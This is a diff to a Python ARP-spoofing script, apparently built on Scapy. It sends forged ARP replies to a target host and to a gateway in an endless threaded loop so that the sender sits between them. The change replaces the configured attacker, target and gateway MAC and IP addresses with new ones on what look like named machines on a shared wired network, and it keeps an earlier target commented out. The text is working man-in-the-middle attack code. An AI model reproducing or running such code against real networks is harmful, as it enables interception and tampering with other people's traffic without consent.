@@ -29,13 +29,22 @@ def createArp2Gateway(srcMac,gatewayMac,tgtIP,gatewayIP):
     return pkt
 def arp():
   try:
-    srcMac='f0:18:98:3d:8e:1a'#本机mac
-    tgtMac='bc:17:b8:ca:df:6e'#目标mac
-    gatewayMac='0:9:f:9:0:12'#网关mac
-    gatewayIP='10.104.255.254'#网关ip
-    tgtIP='10.104.0.56'#目标ip
+    # 3502 rich 有線
+    # srcMac='a0:ce:c8:62:d1:c3'#本机mac
+    # tgtMac='a0:ce:c8:ef:63:12'#目标mac
+    # gatewayMac='00:09:0f:09:00:12'#网关mac
+    # gatewayIP='10.24.10.254'#网关ip
+    # tgtIP='10.24.10.111'#目标ip
+    # 3502 ムロ　有線
+    srcMac='a0:ce:c8:62:d1:c3'#本机mac
+    tgtMac='0c:37:96:1f:2a:e8'#目标mac
+    gatewayMac='00:09:0f:09:00:12'#网关mac
+    gatewayIP='10.29.10.254'#网关ip
+    tgtIP='10.29.10.56'#目标ip
+
     pktstation = createArp2Station(srcMac,tgtMac,gatewayIP,tgtIP)
     pktgateway = createArp2Gateway(srcMac,gatewayMac,tgtIP,gatewayIP)
+    print(pktstation)
     while True:
         t = threading.Thread(target=sendp,args=(pktstation,))
         t.start()
@@ -44,6 +53,7 @@ def arp():
         s.start()
         s.join()
         time.sleep(1)#一般休眠1秒即可，如果不行，修改为0.1秒
+
   except Exception as g:
     traceback.print_exc()
     exit()
